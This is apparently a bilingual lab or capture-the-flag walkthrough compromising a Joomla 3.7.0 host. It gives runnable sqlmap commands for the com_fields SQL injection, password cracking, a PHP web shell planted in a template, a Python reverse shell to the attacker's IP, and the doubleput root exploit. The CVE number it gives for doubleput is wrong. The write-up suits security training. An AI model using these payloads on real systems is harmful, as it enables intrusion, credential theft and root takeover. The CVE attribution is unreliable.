# 🛡️ 靶场渗透笔记：Joomla! 3.7.0 SQL Injection & Local Privilege Escalation

> 🎯 漏洞类型：CMS SQL注入 + 一句话木马 + Python反弹Shell + 本地提权（doubleput）

------

## 📍信息收集阶段 / Information Gathering

### ✅ 中文步骤：

1. 使用 `dirsearch` 扫描网站目录，发现登录路径。

2. 使用 `CMSeeK` 检测目标为 Joomla 3.7.0：

   ```apl
   cmseek -u http://192.168.111.163
   ```

3. 确认管理员路径：`http://192.168.111.163/administrator`

### ✅ English Summary:

1. Used `dirsearch` to find login interface.
2. Detected CMS as Joomla 3.7.0 using `CMSeeK`.
3. Admin URL confirmed as: `http://192.168.111.163/administrator`

------

## 🧨 漏洞利用阶段 / Exploitation

### ✅ 中文步骤：

1. 查找漏洞：

   ```apl
   searchsploit Joomla 3.7.0
   ```

   发现：Joomla! 3.7.0 - 'com_fields' SQL Injection

2. 查看漏洞详情：

   ```apl
   cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
   ```

3. 使用 `sqlmap` 测试注入点：

   ```apl
   sqlmap -u "http://192.168.111.163/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
   --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
   ```

4. 确定数据库为：`joomladb`

5. 枚举表格：

   ```apl
   sqlmap -u ... -D joomladb --tables
   ```

6. 枚举字段：

   ```apl
   sqlmap -u ... -D joomladb -T '#__users' --columns
   ```

7. 导出用户名和密码：

```apl
sqlmap -u ... -T '#__users' -C username,password --dump
```

1. 使用 `john` 破解密码：

```apl
john /root/Desktop/pass.txt
```

1. 成功获得后台账号 `snoopy`，登录 Joomla 后台，修改 Beez3 模板中的 `component.php` 添加一句话木马：

```apl
<?php $var=shell_exec($_GET['cmd']); echo $var; ?>
```

1. 访问木马测试是否存在 Python：

```apl
http://192.168.111.163/templates/beez3/component.php?cmd=which python
```

1. 本地监听反弹端口：

```apl
nc -nvlp 8888
```

1. 在目标机器上触发反弹 Shell：

```apl
http://192.168.111.163/templates/beez3/component.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.111.143",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

1. 获得 Shell 后稳定：

```apl
python -c "import pty;pty.spawn('/bin/bash')"
```

------

## 🧬 提权阶段 / Privilege Escalation

### ✅ 中文步骤：

1. 查看系统版本：

```apl
tac /etc/issue
```

或使用提权检测脚本，确认系统为 Ubuntu 16.04。

1. 搜索提权漏洞：

```apl
searchsploit Ubuntu 16.04
```

1. 下载 doubleput 提权工具：

```apl
locate 39772.txt
cat /usr/share/exploitdb/exploits/linux/local/39772.txt
```

1. 按链接下载 ZIP 包并传输到目标主机，解压后执行：

```apl
chmod +x compile.sh
./compile.sh
./doubleput
```

1. 显示 “you'll have a root shell in <=60 seconds.” 即提权成功！

### ✅ English Summary:

- Used SQL injection in Joomla to retrieve credentials
- Uploaded PHP shell via Joomla template
- Gained reverse shell using Python
- Performed local privilege escalation using **doubleput** exploit (CVE-2017-16995)

------

## 🏁 总结 / Summary

| 阶段      | 工具                | 技术                      |
| --------- | ------------------- | ------------------------- |
| 信息收集  | dirsearch / CMSeeK  | CMS识别                   |
| 漏洞利用  | sqlmap / Joomla后台 | SQL注入 / 木马上传        |
| Shell获取 | Python              | 反弹Shell                 |
| 提权      | doubleput           | 本地提权 (CVE-2017-16995) |